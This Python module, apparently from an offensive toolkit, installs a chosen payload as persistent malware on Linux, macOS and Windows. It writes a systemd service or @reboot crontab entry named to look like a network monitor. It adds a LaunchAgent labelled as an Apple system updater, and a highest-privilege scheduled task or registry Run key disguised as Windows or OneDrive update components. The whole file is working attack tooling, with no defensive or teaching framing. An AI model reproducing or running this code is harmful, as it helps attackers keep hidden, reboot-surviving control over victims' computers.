"""
modules/persistence.py — Cross-Platform Persistence Engine
FIXES:
  - Added run_persistence() entry point callable from main.py
  - PersistenceEngine class unchanged
"""

import os
import sys
import platform
import subprocess
import questionary
from rich.console import Console
from core.ui import draw_header, Q_STYLE

console = Console()


# ─────────────────────────────────────────────────────────────────────────────
#  ENGINE
# ─────────────────────────────────────────────────────────────────────────────

class PersistenceEngine:
    def __init__(self, path: str):
        self.path = path
        self.os_type = platform.system()   # "Linux" | "Darwin" | "Windows"

    # ── Linux ─────────────────────────────────────────────────────────────────

    def install_linux_watchdog(self):
        """Systemd service that auto-restarts the payload on crash."""
        service_name = "system-network-monitor"
        service_body = f"""[Unit]
Description=Network Monitor Service
After=network.target

[Service]
ExecStart={self.path}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
        service_path = f"/etc/systemd/system/{service_name}.service"
        try:
            with open(service_path, "w") as f:
                f.write(service_body)
            subprocess.run(["systemctl", "daemon-reload"],         check=True)
            subprocess.run(["systemctl", "enable", service_name],  check=True)
            subprocess.run(["systemctl", "start",  service_name],  check=True)
            console.print(
                f"[bold green][+] Linux persistence established via systemd "
                f"({service_name}).[/bold green]")
        except PermissionError:
            # Fallback: user crontab
            try:
                cron_job = f"@reboot {self.path}\n"
                result = subprocess.run(
                    "crontab -l 2>/dev/null", shell=True,
                    capture_output=True, text=True)
                new_cron = result.stdout + cron_job
                subprocess.run(
                    f'echo "{new_cron}" | crontab -',
                    shell=True, check=True)
                console.print(
                    "[bold green][+] Linux persistence established via user crontab.[/bold green]")
            except Exception as e:
                console.print(f"[red][!] Crontab fallback failed: {e}[/red]")
        except Exception as e:
            console.print(f"[red][!] Linux persistence failed: {e}[/red]")

    # ── macOS ─────────────────────────────────────────────────────────────────

    def install_mac_launchagent(self):
        """LaunchAgent plist in ~/Library/LaunchAgents/."""
        label = "com.apple.systemupdated"
        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
        launch_dir = os.path.expanduser("~/Library/LaunchAgents")
        plist_path = os.path.join(launch_dir, f"{label}.plist")
        try:
            os.makedirs(launch_dir, exist_ok=True)
            with open(plist_path, "w") as f:
                f.write(plist)
            subprocess.run(["launchctl", "load", plist_path], check=True)
            console.print(
                f"[bold green][+] macOS LaunchAgent persistence established.[/bold green]")
        except Exception as e:
            console.print(f"[red][!] macOS persistence failed: {e}[/red]")

    # ── Windows ───────────────────────────────────────────────────────────────

    def install_windows_schtask(self):
        """Scheduled task masquerading as a Windows Update component."""
        try:
            cmd = (
                f'schtasks /create /tn '
                f'"Microsoft\\Windows\\Wininet\\CacheUpdater" '
                f'/tr "{self.path}" /sc onlogon /rl highest /f'
            )
            result = subprocess.run(cmd, shell=True, capture_output=True)
            if result.returncode == 0:
                console.print(
                    "[bold green][+] Windows Scheduled Task persistence established.[/bold green]")
            else:
                console.print(
                    "[yellow][!] Scheduled task failed (may need admin). "
                    "Falling back to Registry...[/yellow]")
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER, key_path, 0,
                    winreg.KEY_SET_VALUE
                ) as reg_key:
                    winreg.SetValueEx(
                        reg_key, "OneDriveUpdate", 0,
                        winreg.REG_SZ, self.path)
                console.print(
                    "[bold green][+] Windows Registry 'Run' key established.[/bold green]")
        except Exception as e:
            console.print(f"[red][!] Windows persistence failed: {e}[/red]")

    # ── Dispatcher ────────────────────────────────────────────────────────────

    def run(self):
        console.print(
            f"[*] Deploying persistence for: [bold yellow]{self.path}[/bold yellow]")
        if self.os_type == "Linux":
            self.install_linux_watchdog()
        elif self.os_type == "Darwin":
            self.install_mac_launchagent()
        elif self.os_type == "Windows":
            self.install_windows_schtask()
        else:
            console.print(
                f"[yellow][!] OS ({self.os_type}) not supported.[/yellow]")
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()


# ─────────────────────────────────────────────────────────────────────────────
#  ENTRY POINT — called by main.py
# ─────────────────────────────────────────────────────────────────────────────

def run_persistence():
    draw_header("Persistence Engine")
    console.print(
        "[dim]Installs the specified binary/script as a persistent service "
        "that survives reboots.\n"
        "Linux: systemd (root) or crontab fallback\n"
        "macOS: LaunchAgent plist\n"
        "Windows: Scheduled Task (admin) or Registry Run key fallback[/dim]\n"
    )

    path = questionary.text(
        "Full path to payload/binary to persist:",
        style=Q_STYLE
    ).ask()

    if not path:
        return

    if not os.path.exists(path):
        if not questionary.confirm(
            f"Path '{path}' not found locally. Continue anyway?",
            default=False, style=Q_STYLE
        ).ask():
            return

    PersistenceEngine(path).run()


if __name__ == "__main__":
    run_persistence()
